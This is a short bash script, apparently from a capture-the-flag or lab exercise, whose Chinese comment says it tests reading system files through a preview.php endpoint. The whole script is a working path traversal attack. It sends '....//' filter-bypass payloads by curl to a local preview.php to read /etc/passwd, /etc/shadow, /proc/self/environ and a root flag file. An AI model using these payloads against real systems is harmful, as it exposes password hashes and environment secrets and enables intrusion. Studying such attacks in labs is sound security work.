#!/usr/bin/env bash
# 测试各类系统文件经 preview.php 的读取效果
targets=(
    "....//....//....//etc/hostname"
    "....//....//....//etc/passwd"
    "....//....//....//etc/shadow"
    "....//....//....//root/flag"
    "....//....//....//proc/self/environ"
)
for f in "${targets[@]}"; do
    echo "===== file=$f ====="
    curl -s "http://127.0.0.1:8081/debug/preview.php?file=$f" | head -4
    echo ""
done
